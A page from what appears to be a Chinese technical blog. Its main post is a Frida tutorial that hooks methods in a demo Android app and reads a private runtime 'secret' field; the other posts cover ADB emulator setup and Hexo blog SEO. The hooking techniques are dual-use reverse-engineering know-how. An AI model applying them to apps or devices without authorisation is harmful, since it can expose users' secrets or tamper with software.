</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/02/22/blog02/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-02-15T16:00:00.000Z" title="2/16/2020, 12:00:00 AM">2020-02-16</time></span><i class="material-icons">schedule</i><span class="level-item">7 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/reverse/">reverse</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/02/16/frida/">【安卓逆向】Frida Hook 動態調試</a></h1><div class="content"><p>今天我們要來練習用 frida 在 Android 上做動態調試</p>
<h2 id="逆之呼吸壹之型-一般函式">逆之呼吸壹之型 - 一般函式</h2>
<p>先來寫個簡單的範例 APP<br>
有一個按扭和一個輸入欄，輸入名字之後，按下按鈕，就會顯示 Hello 加上你輸入的名字<br>
不會寫 APP 的小朋友可以先去 youtube 上找教學，有一大堆</p>
<figure class="highlight java"><figcaption><span>MainActivity.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="type">Button</span> <span class="variable">sayButton</span> <span class="operator">=</span> findViewById(R.id.sayButton);</span><br><span class="line">        sayButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">EditText</span> <span class="variable">somethingEditText</span> <span class="operator">=</span> findViewById(R.id.somethingEditText);</span><br><span class="line">                <span class="type">TextView</span> <span class="variable">resultTextView</span> <span class="operator">=</span> findViewById(R.id.resultTextView);</span><br><span class="line">                <span class="type">String</span> <span class="variable">something</span> <span class="operator">=</span> somethingEditText.getText().toString();</span><br><span class="line">                resultTextView.setText(say(something));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">say</span> <span class="params">(String something)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + something;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p align="center"><img data-src="/images/example-app.png" class=" lazyload"  width="300" title="example app"></p>
<p>python 負責呼叫 frida api 做注入，javascript 是被注入進去做事的<br>
我們的目標是 hook 函式 <code>say</code>，並在原本的輸出文字後面加上 <code>!!!</code></p>
<figure class="highlight python"><figcaption><span>hook.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.example.myapplication&quot;</span>])</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;script.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">    script.on(<span class="string">&quot;message&quot;</span>, on_message)</span><br><span class="line">    script.load()</span><br><span class="line"></span><br><span class="line">device.resume(pid)</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><figcaption><span>script.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    main = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.myapplication.MainActivity&quot;</span>)</span><br><span class="line">    main.<span class="property">say</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">something</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="variable language_">this</span>.<span class="title function_">say</span>(something)</span><br><span class="line">        <span class="keyword">return</span> ret + <span class="string">&#x27;!!!&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p align="center"><img data-src="/images/example-app-hook.png" class=" lazyload"  width="300" title="example app hook"></p>
<h2 id="逆之呼吸貳之型-重載函式">逆之呼吸貳之型 - 重載函式</h2>
<p>改一下範例 APP，多加上一個接受數字做輸入的 <code>say</code> 函式<br>
接收到數字後，就輸出 Hello 加上輸入的數字的平方</p>
<figure class="highlight java"><figcaption><span>MainActivity.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="type">Button</span> <span class="variable">sayButton</span> <span class="operator">=</span> findViewById(R.id.sayButton);</span><br><span class="line">        sayButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">EditText</span> <span class="variable">somethingEditText</span> <span class="operator">=</span> findViewById(R.id.somethingEditText);</span><br><span class="line">                <span class="type">TextView</span> <span class="variable">resultTextView</span> <span class="operator">=</span> findViewById(R.id.resultTextView);</span><br><span class="line">                <span class="type">String</span> <span class="variable">something</span> <span class="operator">=</span> somethingEditText.getText().toString();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Integer</span> <span class="variable">number</span> <span class="operator">=</span> Integer.parseInt(something);</span><br><span class="line">                    resultTextView.setText(say(number));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                    resultTextView.setText(say(something));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">say</span> <span class="params">(String something)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + something;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">say</span> <span class="params">(Integer number)</span> &#123;</span><br><span class="line">        number = number * number;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + number.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p align="center"><img data-src="/images/example-app2.png" class=" lazyload"  width="300" title="example app"></p>
<p>兩個 <code>say</code> 都是一樣的名字，所以 hook 的時候要用 <code>overload</code> 去區分，<code>overload</code> 參數放的是目標函式輸入參數的型態<br>
這次我們在新的 <code>say</code> 函式的輸出文字後面加上 <code>???</code><br>
<code>hook.py</code> 跟上一個例子一樣就不再貼一次了</p>
<figure class="highlight javascript"><figcaption><span>script.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    main = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.myapplication.MainActivity&quot;</span>)</span><br><span class="line">    main.<span class="property">say</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.String&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">something</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="variable language_">this</span>.<span class="title function_">say</span>(something)</span><br><span class="line">        <span class="keyword">return</span> ret + <span class="string">&#x27;!!!&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    main.<span class="property">say</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.Integer&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">number</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="variable language_">this</span>.<span class="title function_">say</span>(number)</span><br><span class="line">        <span class="keyword">return</span> ret + <span class="string">&#x27;???&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p align="center"><img data-src="/images/example-app2-hook.png" class=" lazyload"  width="300" title="example app hook"></p>
<h2 id="逆之呼吸參之型-隱藏函式">逆之呼吸參之型 - 隱藏函式</h2>
<p>再改一下範例 APP，多加上一個變數 <code>secret</code> 和一個函式 <code>getSecret</code>，在 <code>onCreate</code> 裡面會給 <code>secret</code> 一個隨機值，我們的目標就是找出這個值</p>
<figure class="highlight java"><figcaption><span>MainActivity.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> secret;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        secret = (<span class="type">int</span>) (Math.random() * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Button</span> <span class="variable">sayButton</span> <span class="operator">=</span> findViewById(R.id.sayButton);</span><br><span class="line">        sayButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">EditText</span> <span class="variable">somethingEditText</span> <span class="operator">=</span> findViewById(R.id.somethingEditText);</span><br><span class="line">                <span class="type">TextView</span> <span class="variable">resultTextView</span> <span class="operator">=</span> findViewById(R.id.resultTextView);</span><br><span class="line">                <span class="type">String</span> <span class="variable">something</span> <span class="operator">=</span> somethingEditText.getText().toString();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Integer</span> <span class="variable">number</span> <span class="operator">=</span> Integer.parseInt(something);</span><br><span class="line">                    resultTextView.setText(say(number));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                    resultTextView.setText(say(something));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">say</span> <span class="params">(String something)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + something;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    String <span class="title function_">say</span> <span class="params">(Integer number)</span> &#123;</span><br><span class="line">        number = number * number;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + number.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">getSecret</span> <span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因為我們的目標不是自己 new 一個物件出來抓 <code>secret</code>，這樣就只是一個我們自己就可以生成的隨機值而已<br>
我們是要找出目前已經存在的那個 instance 的 <code>secret</code>，在實際例子中可能就會是一組隨機生成的密碼之類的<br>
所以我們要用到 <code>Java.choose</code> 去抓 instance，抓到 instance 後，可以</p>
<ol>
<li><code>instance.getSecret()</code> 呼叫函式搞定</li>
<li><code>instance.secret.value</code> 存取變數搞定</li>
</ol>
<p>然後用 <code>send</code> 可以把資料傳到 python 端的 <code>on_message</code> 做處理</p>
<figure class="highlight javascript"><figcaption><span>script.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.myapplication.MainActivity&quot;</span>, &#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line">            <span class="title function_">send</span>(instance.<span class="title function_">getSecret</span>())  <span class="comment">// call function</span></span><br><span class="line">            <span class="title function_">send</span>(instance.<span class="property">secret</span>.<span class="property">value</span>) <span class="comment">// access vairable</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="疑難雜症-3">疑難雜症</h2>
<p>Q : 有函式 <code>a</code> 跟變數 <code>a</code> 同名怎麼辦 ?<br>
A : <code>a</code> 存取函式，<code>_a</code> 存取變數</p>
<hr>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/hookmaster/frida-all-in-one">https://github.com/hookmaster/frida-all-in-one</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/frida/frida/issues/833">How to access class member variable if there’s a member function called the same name?</a></li>
</ol>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/02/16/frida/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-02-14T16:00:00.000Z" title="2/15/2020, 12:00:00 AM">2020-02-15</time></span><i class="material-icons">schedule</i><span class="level-item">3 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/reverse/">reverse</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/02/15/android-emulator/">【安卓逆向】Android Studio Emulator + ADB 環境佈置</a></h1><div class="content"><p>紀錄一下怎麼設定好一台 Android 的虛擬機</p>
<ol>
<li>我是用 Android Studio 裡面的 Emulator，所以要先裝一下 <a target="_blank" rel="noopener" href="https://developer.android.com/studio">Android Studio</a></li>
<li>打開 AVD Manager 後點 Create Virtual Device</li>
</ol>
<p align="center"><img data-src="/images/avd-manager.png" class=" lazyload"  title="AVD Manager"></p>
<ol start="3">
<li>選一個 device，比如 Pixel 3a</li>
<li>選一個 system image，比如 Pie</li>
<li>完成</li>
</ol>
<h2 id="ADB-Android-Debug-Bridge">ADB ( Android Debug Bridge )</h2>
<h3 id="路徑">路徑</h3>
<p>在 Android SDK 的 platform-tools 裡面，用 macos 的話應該會在 <code>/Users/xxx/Library/Android/sdk/platform-tools/</code><br>
沒有的話可以去 <a target="_blank" rel="noopener" href="https://developer.android.com/studio/releases/platform-tools">官網</a> 載</p>
<h3 id="基本功能">基本功能</h3>
<table>
<thead>
<tr>
<th>指令</th>
<th>解釋</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>adb devices</code></td>
<td>列出所有裝置</td>
</tr>
<tr>
<td><code>adb root</code></td>
<td>用 root 權限重開 adb 服務</td>
</tr>
<tr>
<td><code>adb shell</code></td>
<td>互動式的 shell</td>
</tr>
<tr>
<td><code>adb shell &quot;ls&quot;</code></td>
<td>執行一行指令</td>
</tr>
<tr>
<td><code>adb push ./myfile /data/local/tmp/</code></td>
<td>傳檔案進去</td>
</tr>
<tr>
<td><code>adb pull /data/local/tmp/myfile ./</code></td>
<td>抓檔案出來</td>
</tr>
<tr>
<td><code>adb reboot</code></td>
<td>重開機，可以簡單粗暴的驗證有沒有設置成功</td>
</tr>
</tbody>
</table>
<p>如果有多台裝置的話，要加 <code>-s</code> 指定哪一個裝置，比如 <code>adb -s emulator-5554 shell</code></p>
<h2 id="疑難雜症">疑難雜症</h2>
<p>Q : 遇到 <code>adbd cannot run as root in production builds</code> 怎麼辦 ?<br>
A : 在選 image 的時候要選 target 是 Google APIs 的</p>
<p>Q : 怎麼卸載 system image ?<br>
A : 打開 SDK Manager ( 在 AVD Manager 旁邊 )，勾選 Show Package Details，就可以看到下載過的 system image，取消勾選再按 OK 就卸載了</p>
<p>Q : 怎麼卸載 app ?<br>
A : 除了麻瓜的方法外，也可以在 <code>adb shell</code> 拿到 shell 之後，用 <code>pm list packages</code> 看有哪些 app，再用 <code>pm uninstall -k com.example.test_app</code> 卸載 app</p>
<p>Q : 怎麼把 apk 抓出來?<br>
A : 先用 <code>pm path com.example.test_app</code> 找出 apk 的路徑，再用 <code>adb pull /data/app/com.example.test_app.apk ./</code> 抓出來</p>
<h2 id="其他的-Android-虛擬機">其他的 Android 虛擬機</h2>
<p>如果你只是想玩遊戲的話，可以參考下面幾款模擬器</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://www.bluestacks.com/">BlueStacks</a></li>
<li><a target="_blank" rel="noopener" href="https://www.bignox.com/">NoxPlayer ( 夜神模擬器 )</a></li>
<li><a target="_blank" rel="noopener" href="https://memuplay.com/">MemuPlay ( 逍遙模擬器 )</a></li>
<li>等等</li>
</ol>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/02/15/android-emulator/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-02-07T16:00:00.000Z" title="2/8/2020, 12:00:00 AM">2020-02-08</time></span><i class="material-icons">schedule</i><span class="level-item">2 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E7%A8%8B%E5%BC%8F/">程式</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/02/08/blog01/">【部落格開發日誌】0x01</a></h1><div class="content"><p>部落格架好後，趁熱使用一下各種網站追蹤評測的工具，比如 <a target="_blank" rel="noopener" href="https://search.google.com/search-console">Google Search Console</a>, <a target="_blank" rel="noopener" href="https://analytics.google.com/analytics/web/">Google Analytics</a>, <a target="_blank" rel="noopener" href="https://developers.google.com/speed/pagespeed/insights/">PageSpeed Insights</a>, <a target="_blank" rel="noopener" href="https://sitechecker.pro/">Sitechecker</a>, <a target="_blank" rel="noopener" href="https://www.hotjar.com/">Hotjar</a></p>
<h2 id="Hotjar">Hotjar</h2>
<p>記錄使用者點擊的 heatmap</p>
<p align="center"><img data-src="/images/hotjar-heatmap.png" class=" lazyload"  width="800" title="hotjar heatmap example"></p>
<p>記錄使用者游標移動的路徑</p>
<p align="center"><img data-src="/images/hotjar-record.gif" class=" lazyload"  width="800" title="hotjar record example"></p>
<p>還可以收集使用者的 feedback 回饋，不過載入時間有點久，部落格也不太需要這些資訊，所以就拔掉了，試用一下而已xD</p>
<h2 id="SEO">SEO</h2>
<h3 id="Defer-offscreen-images">Defer offscreen images</h3>
<p>參考 <a target="_blank" rel="noopener" href="https://web.dev/codelab-use-lazysizes-to-lazyload-images/">Lazy load offscreen images with lazysizes</a>，只要載入 <a target="_blank" rel="noopener" href="https://github.com/aFarkas/lazysizes">lazysizes</a> 這個 scripts 進來，然後把 <code>src</code> 改成 <code>data-src</code> 並加上 <code>class=&quot;lazyload&quot;</code> 就好了</p>
<p>註冊個 hexo 的 <code>after_render</code>，把所有 img tag 抓出來改就完事了</p>
<figure class="highlight js"><figcaption><span>scripts/lazy-load-image.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo.<span class="property">extend</span>.<span class="property">filter</span>.<span class="title function_">register</span>(<span class="string">&#x27;after_render:html&#x27;</span>, <span class="keyword">function</span> (<span class="params">htmlContent</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> htmlContent.<span class="title function_">replace</span>(<span class="regexp">/&lt;img src=&quot;([^&quot;]*)&quot; (?:class=&quot;([^&quot;]*)&quot;)?([^&gt;]*)&gt;/</span>, <span class="string">&#x27;&lt;img data-src=&quot;$1&quot; class=&quot;$2 lazyload&quot; $3&gt;&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://github.com/aFarkas/lazysizes">lazysizes</a> 有 cdn，很方便的</p>
<figure class="highlight plaintext"><figcaption><span>layout/common/scripts.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.0/lazysizes.min.js&quot; defer&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="Sitemap">Sitemap</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-sitemap</span><br></pre></td></tr></table></figure>
<p>裝好 hexo-generator-sitemap 之後，在 <code>_config.yml</code> 加一行收工</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sitemap:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">sitemap.xml</span></span><br></pre></td></tr></table></figure>
<h3 id="Robots-txt">Robots.txt</h3>
<p>直接放在 <code>source/_posts</code> 下面就行了，簡單搞定</p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/02/08/blog01/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-01-22T16:00:00.000Z" title="1/23/2020, 12:00:00 AM">2020-01-23</time></span><i class="material-icons">schedule</i><span class="level-item">8 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E7%A8%8B%E5%BC%8F/">程式</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/01/23/blog00/">【部落格開發日誌】0x00</a></h1><div class="content"><p>之前的部落格是用 mkdocs，但是 mkdocs 其實是用來生成 document 的，不是拿來生成部落格的，所以文章都沒有日期，也沒有近期文章或是標籤的功能，我之所以選 mkdocs 是因為 <a target="_blank" rel="noopener" href="https://github.com/squidfunk/mkdocs-material">mkdocs-material</a> 實在太好看了很對我胃口，不過最近興起了想幫部落格換個皮的念頭，主要是看上了 <a target="_blank" rel="noopener" href="https://blog.zhangruipeng.me/hexo-theme-icarus/">icarus</a> 和 <a target="_blank" rel="noopener" href="https://xaoxuu.com/wiki/material-x/">material-x</a> 這兩個主題，都是 hexo 的主題，最後選了 <a target="_blank" rel="noopener" href="https://blog.zhangruipeng.me/hexo-theme-icarus/">icarus</a>，然後再自己手動調整，下面會說明一下我手動調整的內容</p>
<h2 id="排版">排版</h2>
